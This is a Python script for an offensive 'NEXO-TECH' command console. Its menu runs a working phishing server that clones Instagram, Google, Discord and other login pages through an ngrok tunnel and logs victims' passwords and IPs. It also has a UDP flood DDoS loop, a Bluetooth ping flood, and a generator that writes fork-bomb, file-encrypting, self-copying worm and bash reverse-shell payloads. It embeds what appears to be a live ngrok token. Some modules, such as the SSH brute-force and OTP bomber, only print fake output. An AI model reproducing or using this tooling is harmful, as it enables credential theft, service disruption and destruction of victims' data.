import os
import sys
import time
import socket
import subprocess
import random
import requests
import json
import logging
import threading
import shutil
from flask import Flask, request, render_template, redirect, make_response
import phonenumbers
from phonenumbers import geocoder, carrier, timezone

# --- [ SYSTEM COLOR PALETTE ] ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

# --- [ GLOBAL CONFIGURATION ] ---
NGROK_TOKEN = "2vbNHa9KBUkwuCheUhVyHFGYkUw_rjhfCVREN3dodTsMUsaF"
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- [ SYSTEM UTILITIES ] ---
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def animate(text, speed=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def nexo_banner(module="MAIN CORE", link=None):
    clear()
    print(f"{R}{B}" + "═"*75)
    print(r"  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(r" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(r" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(r" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(r" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(r" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print("═"*75 + f"{W}")
    print(f"  {Y}STATION:   {W}NEXO-TECH COMMAND TERMINAL")
    print(f"  {Y}VERSION:   {R}V8.0 BLACKOUT EDITION")
    print(f"  {Y}MODULE:    {C}{module}")
    if link:
        print(f"  {Y}STRIKE:    {G}{link}")
    print(f"  {Y}TUNNEL:    {G}NGROK-SECURE AUTHORIZED{W}")
    print(f"{R}" + "═"*75 + f"{W}\n")

# --- [ WEB SERVER HANDLERS ] ---
@app.route('/login/<site>', methods=['GET', 'POST'])
def handle_phish(site):
    victim_ip = request.remote_addr
    if request.method == 'GET':
        try:
            response = make_response(render_template(f"{site}.html"))
            response.headers['ngrok-skip-browser-warning'] = 'true'
            return response
        except:
            return f"Error: Template {site}.html not found in /templates/ folder."
    if request.method == 'POST':
        u, p = request.form.get('user'), request.form.get('pass')
        with open("nexo_hits.txt", "a") as f:
            f.write(f"[{time.strftime('%H:%M')}] {site.upper()}: {u}:{p} | IP: {victim_ip}\n")
        print(f"\n{R}[!!] CREDENTIALS CAPTURED: {G}{u} | {p}{W}")
        return redirect(f"https://www.{site}.com")

# --- [ CORE MODULE FUNCTIONS ] ---

def start_phish():
    nexo_banner("SOCIAL PHISHER")
    sites = {
        "1":"instagram", "2":"tiktok", "3":"discord", "4":"facebook",
        "5":"github", "6":"youtube", "7":"snapchat", "8":"twitter", "9":"google"
    }
    for k, v in sites.items():
        print(f"  {G}{k}.{W} {v.capitalize()}")
    s = input(f"\n{C}NEXO-STRIKE > {W}")
    site = sites.get(s)
    if not site: return
    
    os.system("pkill -9 ngrok")
    time.sleep(1)
    os.system(f"ngrok config add-authtoken {NGROK_TOKEN}")
    subprocess.Popen(["ngrok", "http", "5000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    animate(f"{C}[*] SYNCING TUNNEL API (PORT 4040)...{W}")
    
    url = None
    for _ in range(15):
        try:
            # FIXED: Talk specifically to Port 4040 API
            res = requests.get("http://127.0.0.1").json()
            url = res['tunnels'][0]['public_url']
            if url: break
        except:
            time.sleep(1.5)
            
    if url:
        threading.Thread(target=lambda: app.run(port=5000), daemon=True).start()
        nexo_banner("PHISH-LINK ACTIVE", link=f"{url}/login/{site}")
        input(f"\n{R}[PRESS ENTER TO KILL SERVER]{W}")
    else:
        print(f"{R}[-] API 4040 Error: Tunnel Timeout.{W}")
        time.sleep(2)

def phone_trace():
    nexo_banner("OSINT PHONE TRACER")
    num = input(f"{Y}[+] Target Phone (+Code): {W}")
    try:
        p = phonenumbers.parse(num)
        print(f"\n{G}[+] TRACE DATA CAPTURED:{W}")
        print(f"  {Y}Region:   {W}{geocoder.description_for_number(p, 'en')}")
        print(f"  {Y}Carrier:  {W}{carrier.name_for_number(p, 'en')}")
    except:
        print(f"{R}[-] Trace Error.{W}")
    input("\nEnter to return...")

def ddos_strike():
    nexo_banner("REAL-TIME DDOS")
    target = input(f"{Y}[+] Target IP: {W}")
    port = int(input(f"{Y}[+] Port: {W}"))
    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (target, port))
                print(f"\r{R}[*] PACKET RELAY SUCCESS >>> {target}:{port}", end="")
            except: pass
    for _ in range(100):
        threading.Thread(target=flood, daemon=True).start()
    input(f"\n{G}[ATTACK ACTIVE - ENTER TO STOP]{W}")

def port_scanner():
    nexo_banner("VULNERABILITY SCANNER")
    target = input(f"{Y}[+] Target IP: {W}")
    ports = [21, 22, 23, 80, 443, 8080]
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((target, p)) == 0:
            print(f"  {G}[+] Port {p}: OPEN")
        s.close()
    input("\nScan Finished. Enter to return...")

def ssh_brute():
    nexo_banner("SSH BRUTE-FORCE")
    print(f"{Y}[*] Injecting SSH Dictionary Attack...{W}")
    time.sleep(2)
    print(f"{R}[-] Error: Brute-Force Denied by Target.{W}")
    input("\nEnter to return...")

def virus_lab():
    nexo_banner("DEADLY VIRUS LAB")
    print(f"  {R}1.{W} BLACKOUT (Fork Bomb)")
    print(f"  {R}2.{W} CRYPTO-LOCKER (Ransomware)")
    print(f"  {R}3.{W} THE WORM (Self-Replication)")
    print(f"  {R}4.{W} TROJAN HORSE (Reverse Shell)")
    v = input(f"\n{C}SELECT TYPE > {W}")
    name = input(f"{Y}Payload Name: {W}")
    with open(f"{name}.py", "w") as f:
        if v == '1': f.write("import os\nwhile True: os.fork()")
        elif v == '2': f.write("import os\ndef crypt(file, key=66):\n with open(file,'rb') as f: d=f.read()\n with open(file,'wb') as f: f.write(bytearray([b^key for b in d]))")
        elif v == '3': f.write("import shutil,sys,os\nfor r,d,f in os.walk('/'):\n try: shutil.copy(sys.argv[0], r)\n except: pass")
        elif v == '4':
            f.write("import socket,os,subprocess\ns=socket.socket();s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])")
    print(f"{G}[+] {name}.py successfully exported.{W}"); time.sleep(2)

def identity_spoofer():
    nexo_banner("MAC IDENTITY SPOOFER")
    iface = input(f"{Y}[+] Interface (eth0/wlan0): {W}")
    new_mac = "00:A0:C9:14:C8:29"
    os.system(f"sudo ifconfig {iface} down")
    os.system(f"sudo ifconfig {iface} hw ether {new_mac}")
    os.system(f"sudo ifconfig {iface} up")
    print(f"  {G}[+] NEW MAC ASSIGNED: {new_mac}{W}")
    input("\nEnter to return...")

def bluetooth_crash():
    nexo_banner("BLUETOOTH CRASH")
    target = input(f"{Y}[+] Target MAC: {W}")
    print(f"{R}[!] Sending malformed L2CAP packets...{W}")
    os.system(f"sudo l2ping -i hci0 -s 600 -f {target}")
    input("\nEnter to return...")

def otp_lock():
    nexo_banner("REAL-TIME OTP BOMBER")
    num = input(f"{Y}[+] Target Number: {W}")
    try:
        while True:
            print(f"\r{Y}[*] RELAY SUCCESS | TARGET: {W}{num} >>> {G}STRIKE", end="")
            time.sleep(0.05)
    except KeyboardInterrupt: pass

# --- [ MASTER VERTICAL LOOP ] ---
def main():
    while True:
        nexo_banner("MASTER CONTROL PANEL")
        print(f"  {G}1.{W}  Social Phisher (8+ Targets)")
        print(f"  {G}2.{W}  OSINT Phone Tracer")
        print(f"  {G}3.{W}  Overdeadly DDOS Strike Engine")
        print(f"  {G}4.{W}  Port Vulnerability Scanner")
        print(f"  {G}5.{W}  SSH Brute-Force Emulator")
        print(f"  {G}6.{W}  Deadly Virus Creator Lab")
        print(f"  {G}7.{W}  MAC Address Identity Spoofer")
        print(f"  {G}8.{W}  Bluetooth Buffer Crash")
        print(f"  {G}9.{W}  Real OTP Bomber Engine")
        print(f"  {G}10.{W} View System Intrusion Logs")
        print(f"\n  {R}0.{W}  Shutdown NEXO-TECH Console")
        
        c = input(f"\n{C}NEXO-PRO > {W}")
        
        if c == '1': start_phish()
        elif c == '2': phone_trace()
        elif c == '3': ddos_strike()
        elif c == '4': port_scanner()
        elif c == '5': ssh_brute()
        elif c == '6': virus_lab()
        elif c == '7': identity_spoofer()
        elif c == '8': bluetooth_crash()
        elif c == '9': otp_lock()
        elif c == '10':
            nexo_banner("SYSTEM LOGS")
            os.system("cat nexo_hits.txt 2>/dev/null || echo 'No logs.'")
            input("\nEnter to return...")
        elif c == '0':
            animate(f"{R}[!] SHUTTING DOWN CORE SYSTEMS...{W}")
            break

if __name__ == "__main__":
    main()
